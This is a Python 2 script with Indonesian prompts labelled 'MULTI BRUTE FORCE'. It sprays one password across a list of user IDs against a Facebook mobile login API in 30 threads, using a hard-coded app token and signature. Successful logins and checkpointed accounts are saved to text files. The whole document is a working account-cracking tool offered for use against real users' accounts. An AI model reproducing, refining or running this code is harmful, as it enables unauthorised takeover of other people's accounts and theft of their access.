import os 
import sys
import time
import json
import urllib
import threading

d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
p = "\033[95;1m"
a = "\033[96;1m"
pu = "\033[97;1m"

count = 0
dados = []
gagal = []
oradadi = []
threads = []

def mbf():

    global file_id, password
    global listID

    try:
        token = open("token.txt", "r")
    except IOError:
        print
        print m+" Token Tidak Ada"
        os.system("rm -f token.txt")
    else:
        os.system('clear')
        print
        print pu+"+==============================+"
        print a+"|       MULTI BRUTE FORCE      |"
        print pu+"+==============================+"
        file_id = raw_input(h+" [+] Masukkan File ID:" + k + " ")
        password = raw_input(h+" [+] Masukkan Password:" + k + " ")
        print
        try:
            listID = open(file_id, "r")
            for ival in range(30):
                iqbal = threading.Thread(target=mbfcrack, args=())
                iqbal.start()
                threads.append(iqbal)

            for ipal in threads:
                ipal.join()

        except IOError:
            print
            print m+" Tidak Ada File Yang Ditemukan.."

def mbfcrack():
    
    global baris
    global dados, gagal
    global oradadi, count
    
    try:
        data_lis = open(file_id, "r")
        baris = data_lis.read().split()
        while listID:
            user = listID.readline().strip()
            url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + password + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
            Iq_data = urllib.urlopen(url)
            jsl = json.load(Iq_data)
            if count == len(baris):
                break
            if "access_token" in jsl:
                sukses = open("Dadi.txt", 'w')
                sukses.write(user + " | " + password + "\n")
                sukses.close()
                dados.append(h+" [OK] " + pu + user + " | " + a + password)
                count += 1
            else:
                if "www.facebook" in jsl["error_msg"]:
                    cekpo = open("cekpoint.txt", "w")
                    cekpo.write(user + " | " + password + "\n")
                    cekpo.close()
                    gagal.append(m+" [CP] " + d + user + " | " + m + password)
                    count += 1
                else:
                    oradadi.append(user)
                    count += 1
            sys.stdout.write(pu+ "\r [$]" + a + " Crack " + p + str(len(baris)) + pu + " / " + p + str(count) + m + " []" + h + " LIVE = " + str(len(dados)) + pu + " | " + k + "CEKPO = " + str(len(gagal)))
            sys.stdout.flush()

    except IOError:
        print
        print m+" Gangguan koneksi.."

def hasil_crack():
    print
    print
    for ipal in dados:
        print ipal
        
    for ival in gagal:
        print ival

    print 
    print m+ " Gagal " + str(len(oradadi))

def main():
    mbf()
    hasil_crack()

if __name__=="__main__":
    main()

        
